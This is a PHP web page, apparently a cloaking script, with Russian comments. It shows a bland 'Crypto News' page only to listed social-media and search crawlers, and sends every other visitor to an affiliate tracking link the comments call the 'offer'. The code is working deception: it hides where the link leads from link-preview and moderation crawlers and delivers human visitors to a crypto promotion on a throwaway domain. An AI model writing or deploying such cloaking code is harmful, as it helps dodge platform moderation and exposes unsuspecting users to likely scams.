<?php
// Список известных ботов
$bots = [
    'facebookexternalhit',
    'Facebot',
    'Twitterbot',
    'Slackbot',
    'TelegramBot',
    'Discordbot',
    'WhatsApp',
    'LinkedInBot',
    'Googlebot',
    'bingbot',
    'Yahoo! Slurp',
    'DuckDuckBot',
    'Baiduspider'
];

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$isBot = false;

// Проверка: содержит ли User-Agent строку одного из известных ботов
foreach ($bots as $bot) {
    if (stripos($userAgent, $bot) !== false) {
        $isBot = true;
        break;
    }
}

// Если не бот — редирект на оффер
if (!$isBot) {
    header("Location: http://cryptogran.one2xcart.top/r2/?lnk=88316&s=vZ6FMobg");
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Crypto News</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; background: #f2f2f2; }
    .content { max-width: 600px; margin: auto; background: #fff; padding: 20px; border-radius: 10px; }
  </style>
</head>
<body>
  <div class="content">
    <h1>Top Crypto News Today</h1>
    <p>Stay informed about the latest developments in the cryptocurrency world.</p>
    <p>We cover Bitcoin, Ethereum, NFTs, and much more. Bookmark this page to never miss an update.</p>
  </div>
</body>
</html>
